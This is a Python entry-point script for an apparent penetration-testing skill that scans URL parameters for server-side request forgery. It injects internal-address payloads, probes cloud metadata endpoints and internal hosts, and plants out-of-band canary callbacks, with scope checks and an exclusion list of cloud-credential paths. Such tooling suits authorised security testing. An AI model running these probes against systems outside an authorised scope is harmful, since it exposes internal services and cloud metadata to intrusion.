#!/usr/bin/env python3
"""
run.py -- ssrf-internal-pivot entry point.

Tests parameters for Server-Side Request Forgery: loopback/IP-encoding bypasses,
cloud metadata (AWS/GCP/Azure IMDS) reachability, internal-host fingerprinting,
and blind SSRF via OOB canary callbacks. Detection + read-only proof.

SAFETY MODEL (offensive skill -- guardrails are load-bearing)
-------------------------------------------------------------
* Detection + read-proof only. We prove the server can be made to fetch an
  attacker-chosen URL and read NON-sensitive metadata (instance-id, the
  meta-data index) as proof. The AWS IAM security-credentials path is
  EXCLUDED -- pulling live cloud creds is active credential theft, a separate
  human-gated action. No file:// / gopher:// internal-exploitation schemes.
* Blind SSRF uses benign OOB canary callbacks (DNS/HTTP ping), correlated via an
  interactsh/OAST poller. No exploitation of any internal service is performed
  beyond a GET used to fingerprint.
* Scope-gated on the vulnerable parameter's host. Full internal response bodies
  are offloaded to the spill store (custody), never inlined.

CONTRACT
--------
* Input  : {"target_url": "https://app/fetch?url=1", "parameters": ["url"],
            "oob_domain": "abc.oast.pro",
            "config": {"internal_targets": ["http://10.0.0.5:8080/"],
                       "oob_poll_url": "https://.../interactions",
                       "concurrency": 8},
            "scope_policy_spill_id": "..."}
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import secrets
import shutil
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl

try:
    import httpx  # type: ignore
except ImportError:  # pragma: no cover
    httpx = None

try:
    from spill_store import read_spill, write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import read_spill, write_spill  # type: ignore

HTTP_TIMEOUT = float(os.environ.get("SSRF_HTTP_TIMEOUT", "20"))
OOB_WAIT = int(os.environ.get("SSRF_OOB_WAIT", "20"))
_PAYLOADS_PATH = os.environ.get(
    "SSRF_PAYLOADS",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "assets", "ssrf-payloads.txt"))

METADATA_HOSTS = ("169.254.169.254", "metadata.google.internal", "100.100.100.200")
# Hard exclusion: never probe live cloud-credential paths.
FORBIDDEN_PATHS = ("iam/security-credentials", "/metadata/identity/oauth2/token",
                   "computeMetadata/v1/instance/service-accounts")
_METADATA_SIG = re.compile(
    r"ami-id|instance-id|instance-identity|reservation-id|computeMetadata|"
    r"Metadata-Flavor|public-hostname|accessKeyId|\"compute\"\s*:|azEnvironment|"
    r"security-credentials", re.I)
_SERVER_SIG = re.compile(r"\b(nginx|apache|microsoft-iis|werkzeug|jetty|tomcat|"
                         r"gunicorn|envoy|kestrel|lighttpd)\b", re.I)


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _host_of(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


def _inject(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def _forbidden(payload: str) -> bool:
    return any(fp in payload for fp in FORBIDDEN_PATHS)


class ScopePolicy:
    def __init__(self, policy: Optional[dict], target_host: str):
        self.raw = policy or {}
        self.have_policy = policy is not None
        self.in_scope = [self._c(p) for p in self.raw.get("in_scope", [])]
        self.out_scope = [self._c(p) for p in self.raw.get("out_of_scope", [])]
        if not self.in_scope and target_host:
            self.in_scope = [self._c(target_host), self._c(f"*.{target_host}")]

    @staticmethod
    def _c(pattern: str) -> re.Pattern:
        p = pattern.strip().lower().rstrip(".")
        if p.startswith("*."):
            return re.compile(rf"^([a-z0-9_-]+\.)*{re.escape(p[2:])}$")
        return re.compile(rf"^{re.escape(p)}$")

    def allowed(self, host: str) -> bool:
        h = (host or "").strip().lower()
        if not h:
            return False
        if any(rx.match(h) for rx in self.out_scope):
            return False
        return any(rx.match(h) for rx in self.in_scope)


class SSRFTester:
    def __init__(self, target_url: str, parameters: List[str], oob_domain: Optional[str] = None,
                 scope_policy_spill_id: Optional[str] = None, config: Optional[dict] = None):
        self.target_url = target_url.strip()
        self.target_host = _host_of(self.target_url)
        self.parameters = [p for p in (parameters or []) if p]
        self.oob_domain = (oob_domain or "").strip() or None
        self.config = config or {}
        self.concurrency = int(self.config.get("concurrency", 8))
        self.errors: List[Dict[str, str]] = []
        self.oob_canaries: Dict[str, dict] = {}   # canary host -> {param, payload}
        policy = None
        if scope_policy_spill_id:
            try:
                policy = read_spill(scope_policy_spill_id)
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "scope_load", "error": str(exc)})
        self.scope = ScopePolicy(policy, self.target_host)
        self.payloads, self.oob_templates = self._load_payloads()
        for t in self.config.get("internal_targets", []) or []:
            if t not in self.payloads:
                self.payloads.append(t)

    def _load_payloads(self) -> Tuple[List[str], List[str]]:
        direct, oob = [], []
        try:
            with open(_PAYLOADS_PATH, "r", encoding="utf-8") as fh:
                for ln in fh:
                    ln = ln.strip()
                    if not ln or ln.startswith("#"):
                        continue
                    if "{OOB}" in ln:
                        oob.append(ln)
                    elif not _forbidden(ln):
                        direct.append(ln)
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "payloads", "error": str(exc)})
        return direct, oob

    # -- target fetch ----------------------------------------------------------
    async def _fetch(self, client, param: str, payload: str) -> Tuple[int, Dict[str, str], str]:
        url = _inject(self.target_url, param, payload)
        try:
            r = await client.get(url, headers={"User-Agent": "ssrf-internal-pivot/1.0"})
            return r.status_code, {k.lower(): v for k, v in r.headers.items()}, r.text
        except Exception as exc:  # noqa: BLE001
            return 0, {}, f"__ERROR__:{exc}"

    @staticmethod
    def _classify(payload: str, body: str, headers: Dict[str, str]) -> Tuple[Optional[str], Optional[str]]:
        """Return (ssrf_type, server_fingerprint) or (None, None) if not internal."""
        phost = _host_of(payload)
        text = body + " " + " ".join(f"{k}: {v}" for k, v in headers.items())
        is_meta = bool(_METADATA_SIG.search(text)) or phost in METADATA_HOSTS
        sm = _SERVER_SIG.search(text)
        server = sm.group(0).lower() if sm else None
        if is_meta:
            return "cloud_metadata", server
        if server or _looks_internal(body):
            return "full_response", server
        return None, server

    async def test_bypasses_and_metadata(self, client, control: Dict[str, str]) -> List[dict]:
        findings: List[dict] = []
        sem = asyncio.Semaphore(self.concurrency)
        seen_params: set = set()

        async def probe(param: str, payload: str):
            if _forbidden(payload):
                return
            async with sem:
                status, headers, body = await self._fetch(client, param, payload)
            if body.startswith("__ERROR__"):
                return
            base = control.get(param, "")
            differs = body != base and len(body) > 0
            stype, server = self._classify(payload, body, headers)
            if stype and differs:
                key = (param, stype)
                if key in seen_params:
                    return
                seen_params.add(key)
                findings.append({
                    "parameter": param, "ssrf_type": stype, "payload": payload,
                    "internal_ip_reached": _host_of(payload),
                    "server_fingerprint": server or "",
                    "status": status,
                    "evidence_spill_id": write_spill({
                        "kind": stype, "param": param, "payload": payload,
                        "target_url": self.target_url, "status": status,
                        "headers": headers, "body": body[:20000],
                        "credential_paths_probed": False, "captured_at": _now_iso()}),
                })

        tasks = [probe(p, pl) for p in self.parameters for pl in self.payloads]
        await asyncio.gather(*tasks)
        return findings

    # -- blind OOB -------------------------------------------------------------
    async def test_blind_oob(self, client) -> List[dict]:
        if not (self.oob_domain or self.config.get("oob_poll_url")):
            return []
        base = self.oob_domain or _host_of(self.config.get("oob_poll_url", "")) or "oob.local"
        sem = asyncio.Semaphore(self.concurrency)

        async def inject(param: str, tmpl: str):
            canary = "s" + secrets.token_hex(6)
            host = f"{canary}.{base}" if self.oob_domain else None
            # when no DNS OOB domain, fall back to a path canary against poll host
            if host:
                payload = tmpl.replace("{OOB}", host)
            else:
                poll = self.config.get("oob_poll_url", "")
                phost = urlsplit(poll)
                payload = f"{phost.scheme}://{phost.netloc}/{canary}"
                host = canary
            self.oob_canaries[canary] = {"param": param, "payload": payload, "host": host}
            async with sem:
                await self._fetch(client, param, payload)

        await asyncio.gather(*(inject(p, t) for p in self.parameters
                               for t in (self.oob_templates or ["http://{OOB}/"])))
        # correlate callbacks
        hits = await self._poll_oob()
        findings = []
        for canary, meta in self.oob_canaries.items():
            if any(canary in h for h in hits):
                findings.append({
                    "parameter": meta["param"], "ssrf_type": "blind_oob",
                    "payload": meta["payload"], "internal_ip_reached": "",
                    "confidence": "confirmed",
                    "evidence_spill_id": write_spill({
                        "kind": "blind_oob", "canary": canary, "param": meta["param"],
                        "payload": meta["payload"], "interaction": True, "captured_at": _now_iso()}),
                })
        # any uncorrelated canaries are pending (for the OOB-handling component)
        if not findings and self.oob_canaries:
            self.errors.append({"stage": "oob", "error":
                                f"{len(self.oob_canaries)} canaries injected; no callback within {OOB_WAIT}s"})
        return findings

    async def _poll_oob(self) -> List[str]:
        """Collect interaction hostnames from an interactsh-style poller.

        Supported: config.oob_poll_url returning a JSON array (or {interactions:[]})
        of strings; or the interactsh-client CLI when present. Both degrade to []."""
        poll = self.config.get("oob_poll_url")
        deadline = time.time() + OOB_WAIT
        collected: List[str] = []
        if poll and httpx is not None:
            while time.time() < deadline:
                try:
                    async with httpx.AsyncClient(timeout=HTTP_TIMEOUT) as c:
                        r = await c.get(poll)
                    data = r.json()
                    items = data.get("interactions", data) if isinstance(data, dict) else data
                    for it in items or []:
                        collected.append(it if isinstance(it, str) else json.dumps(it))
                    if any(cn in " ".join(collected) for cn in self.oob_canaries):
                        break
                except Exception as exc:  # noqa: BLE001
                    self.errors.append({"stage": "oob_poll", "error": str(exc)})
                    break
                await asyncio.sleep(3)
        elif shutil.which("interactsh-client"):
            self.errors.append({"stage": "oob", "error":
                                "interactsh-client present; correlate via component 18 (OOB handler)"})
        return collected

    # -- orchestration ---------------------------------------------------------
    async def run(self) -> dict:
        started = time.time()
        if httpx is None:
            self.errors.append({"stage": "http", "error": "httpx not installed"})
            return self._artifact([], started, fatal=True)
        if not self.scope.allowed(self.target_host):
            self.errors.append({"stage": "scope", "error": f"{self.target_host} not in scope"})
            return self._artifact([], started, fatal=True)
        if not self.parameters:
            self.errors.append({"stage": "input", "error": "no parameters supplied"})
            return self._artifact([], started, fatal=True)

        findings: List[dict] = []
        try:
            async with httpx.AsyncClient(timeout=HTTP_TIMEOUT, follow_redirects=True) as client:
                # per-param control baseline (closed internal port -> failure body)
                control: Dict[str, str] = {}
                for p in self.parameters:
                    _, _, body = await self._fetch(client, p, "http://127.0.0.1:9/")
                    control[p] = "" if body.startswith("__ERROR__") else body
                findings += await self.test_bypasses_and_metadata(client, control)
                findings += await self.test_blind_oob(client)
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "run", "error": repr(exc)})
        return self._artifact(findings, started)

    def _artifact(self, findings: List[dict], started: float, fatal: bool = False) -> dict:
        return {
            "findings": findings,
            "meta": {
                "skill": "ssrf-internal-pivot", "version": "1.0", "phase": "5",
                "status": "error" if fatal else "ok",
                "generated_at": _now_iso(),
                "duration_seconds": round(time.time() - started, 2),
                "target_host": self.target_host,
                "parameters_tested": self.parameters,
                "payloads_tried": len(self.payloads),
                "oob_canaries_injected": len(self.oob_canaries),
                "safety": {"credential_paths_probed": False,
                           "schemes": ["http", "https"],
                           "internal_exploitation": False,
                           "read_only": True},
                "findings_count": len(findings),
            },
            "scope_summary": {"policy_present": self.scope.have_policy,
                              "target_host": self.target_host},
            "errors": self.errors,
        }


def _looks_internal(body: str) -> bool:
    # crude: private-range host strings or common internal HTML titles
    if re.search(r"\b(10|127|192\.168|169\.254|172\.(1[6-9]|2\d|3[01]))\.\d", body):
        return True
    if re.search(r"<title>[^<]*(internal|admin|dashboard|intranet)", body, re.I):
        return True
    return False


# --- entry point -------------------------------------------------------------
def _load_input(argv: List[str]) -> dict:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError("no input: expected JSON {\"target_url\":\"...\",\"parameters\":[...]}")
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(message: str) -> dict:
    return {
        "findings": [],
        "meta": {"skill": "ssrf-internal-pivot", "version": "1.0", "phase": "5",
                 "status": "error", "generated_at": _now_iso()},
        "errors": [{"stage": "init", "error": message}],
    }


async def _amain(argv: List[str]) -> int:
    try:
        payload = _load_input(argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    target = str(payload.get("target_url", "")).strip()
    if not target or urlsplit(target).scheme not in ("http", "https"):
        print(json.dumps(_error_artifact("invalid 'target_url' (need http(s) URL)")))
        return 2
    tester = SSRFTester(
        target_url=target,
        parameters=payload.get("parameters") or [],
        oob_domain=payload.get("oob_domain"),
        scope_policy_spill_id=payload.get("scope_policy_spill_id"),
        config=payload.get("config"),
    )
    artifact = await tester.run()
    print(json.dumps(artifact, ensure_ascii=False))
    return 0


def main() -> int:
    return asyncio.run(_amain(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
